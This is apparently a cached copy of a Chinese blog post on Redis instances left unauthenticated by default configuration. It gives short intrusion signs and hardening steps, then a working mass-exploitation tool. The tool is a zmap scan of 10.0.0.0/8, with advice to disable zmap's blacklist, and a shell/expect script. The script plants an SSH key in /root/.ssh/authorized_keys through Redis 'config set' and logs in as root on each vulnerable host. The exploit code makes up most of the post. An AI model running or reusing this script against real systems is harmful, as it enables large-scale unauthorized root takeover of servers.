@@ -1,0 +1,168 @@
+I"�<p>https://ruby-china.org/topics/28094
+内网中 60% 开放了 redis6379 端口的主机处于可以被利用的危险状态，因为都是一些默认配置造成的
+Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。
+<!-- more -->
+入侵特征：</p>
+
+<p>Redis 可能执行过 FLUSHALL 方法，整个 Redis 数据库被清空
+在 Redis 数据库中新建了一个名为 crackit（网上流传的命令指令） 的键值对，内容为一个 SSH 公钥。
+在 /root/.ssh 文件夹下新建或者修改了 authorized_keys 文件，内容为 Redis 生成的 db 文件，包含上述公钥
+三、修复建议
+1.禁止一些高危命令
+修改 redis.conf 文件，添加</p>
+
+<p>rename-command FLUSHALL “”
+rename-command CONFIG   “”
+rename-command EVAL     “”
+来禁用远程修改 DB 文件地址</p>
+
+<p>2.以低权限运行 Redis 服务
+为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
+
+<p>3.为 Redis 添加密码验证
+修改 redis.conf 文件，添加</p>
+
+<p>requirepass mypassword
+4.禁止外网访问 Redis
+修改 redis.conf 文件，添加或修改</p>
+
+<p>bind 127.0.0.1
+使得 Redis 服务只在当前主机可用</p>
+
+<p>四、扫描工具
+1 使用说明
+#以Ubuntu为例
+su</p>
+
+<h1 id="requirements">Requirements</h1>
+<p>apt-get install redis-server expect zmap</p>
+
+<p>git clone https://github.com/qingxp9/yyfexploit
+cd yyfexploit/redis</p>
+
+<h1 id="扫描6379端口">扫描6379端口</h1>
+<h1 id="如果你要扫内网把etczmapzmapconf中blacklist-file这一行注释掉">如果你要扫内网，把/etc/zmap/zmap.conf中blacklist-file这一行注释掉</h1>
+<p>zmap -p 6379 10.0.0.0/8 -B 10M -o ip.txt</p>
+
+<h1 id="usage">Usage</h1>
+<p>./redis.sh ip.txt
+最后，将会生成几个 txt 文件记录结果 其中： runasroot.txt 表示 redis 无认证，且以 root 运行 noauth.txt 表示 redis 无认证，但以普通用户运行 rootshell.txt 已写入公钥，可直接以证书登录 root 用户</p>
+
+<p>像这样：</p>
+
+<p>ssh -i id_rsa root@x.x.x.x
+2 工具源代码
+就贴下代码吧，各位大牛请在家长陪同下观看</p>
+
+<p>#!/bin/sh
+ if [ $# -eq 1  ]
+ then
+   ip_list=$1</p>
+
+<p>##create id_rsa
+   echo “<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>Create id_rsa file”</p>
+
+<p>expect -c “
+     spawn ssh-keygen -t rsa -f id_rsa -C "yyf"
+     expect {
+         "<em>passphrase): " {
+             exp_send "\r"
+             exp_continue
+         }
+         "</em>again: " {
+             exp_send "\r"
+         }
+         "*y/n)? " {
+             exp_send "n\r"
+         }
+     }
+     expect eof
+   “</p>
+
+<p>echo “\n\n<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**Attack Targets”
+   touch noauth.txt runasroot.txt rootshell.txt haveauth.txt
+   i=0
+   cat $ip_list | while read ip
+   do
+     i=<code class="language-plaintext highlighter-rouge">expr $i + 1</code>;
+     #write id_rsa.pub to remote
+     echo “</strong><strong><em>${i}</em></strong>connect to remote ${ip} redis “</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> expect -c "
+   set timeout 3
+   spawn redis-cli -h $ip config set dir /root/.ssh/
+   expect {
+     \"OK\"                        { exit 0 }
+     \"ERR Changing directory: Permission denied\"         { exit 1 }
+     timeout                       { exit 2 }
+     \"(error) NOAUTH Authentication required\"         { exit 3 }
+   }
+ "
+
+ case $? in
+     0)  echo "run redis as root"
+         echo $ip &gt;&gt; noauth.txt
+         echo $ip &gt;&gt; runasroot.txt
+     ;;
+     1)  echo "not run redis as root\n\n\n"
+         echo $ip &gt;&gt; noauth.txt
+         continue
+     ;;
+     2)  echo "connect timeout\n\n\n"
+         continue
+     ;;
+     3)  echo "Have Auth\n\n\n"
+         echo $ip &gt;&gt; haveauth.txt
+         continue
+     ;;
+ esac
+
+ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt
+ cat foo.txt | redis-cli -h $ip -x set 1
+ redis-cli -h $ip config set dir /root/.ssh/
+ redis-cli -h $ip config set dbfilename "authorized_keys"
+ redis-cli save
+
+ #login test
+ echo "#try to login"
+ expect -c "
+   set timeout 5
+   spawn ssh -i id_rsa root@$ip echo \"yyf\"
+   expect {
+     \"*yes/no\"     { send \"yes\n\"}
+
+     \"*password\"   { send \"\003\"; exit 1 }
+     \"yyf\"         { exit 0 }
+     timeout         { exit 2 }
+   }
+   exit 4
+ "
+
+ exitcode=$?
+
+ if [ $exitcode -eq 0 ]
+ then
+   echo "---------------${ip} is get root shell"
+   echo $ip &gt;&gt; rootshell.txt
+ fi
+
+ echo "\n\n\n"    done
+</code></pre></div></div>
+
+<p>echo “##########Final Count##########”
+   wc -l $ip_list
+   echo “———-“
+   wc -l noauth.txt
+   wc -l runasroot.txt
+   wc -l rootshell.txt
+   echo “———-“
+   wc -l haveauth.txt</p>
+
+<p>else
+   echo “usage: ./redis.sh ip.txt”
+ fi
+五、相关参考
+http://zone.wooyun.org/content/23858
+https://blog.islandzero.net/2015/11/11/redis-crackit/
+http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</p>
+:ET
